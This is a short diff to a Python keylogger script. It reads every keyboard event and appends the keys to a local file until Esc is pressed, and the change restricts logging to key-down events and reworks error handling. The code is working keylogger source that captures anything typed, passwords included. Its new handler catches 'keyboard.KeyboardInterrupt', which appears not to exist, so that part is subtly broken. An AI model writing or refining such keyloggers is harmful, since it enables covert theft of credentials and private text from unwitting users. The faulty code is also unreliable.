@@ -1,24 +1,28 @@
 import keyboard
 import sys
-import traceback
 
 def main():
     try:
-        log_file = "keylog.txt"
-        with open(log_file, 'a') as f:
+        with open("keystrokes.txt", "a") as f:
             while True:
                 event = keyboard.read_event()
+                
                 if event.name == 'esc':
                     break
-                elif len(event.name) > 1:
-                    f.write('[' + event.name.upper() + ']')
-                else:
-                    f.write(event.name)
+                    
+                output = ''
+                if event.event_type == keyboard.KEY_DOWN:
+                    if len(event.name) > 1 or event.name in ['space', 'enter']:
+                        output += f'[{event.name}]'
+                    else:
+                        output += event.name
+                f.write(output)
+    except keyboard.KeyboardInterrupt:
+        print("Exiting...")
+        sys.exit()
     except Exception as e:
-        print("Error occurred:", str(e))
-        traceback.print_exc()
-    finally:
-        sys.exit(0)
+        print(f"Error: {e}")
+        sys.exit()
 
 if __name__ == "__main__":
     main()
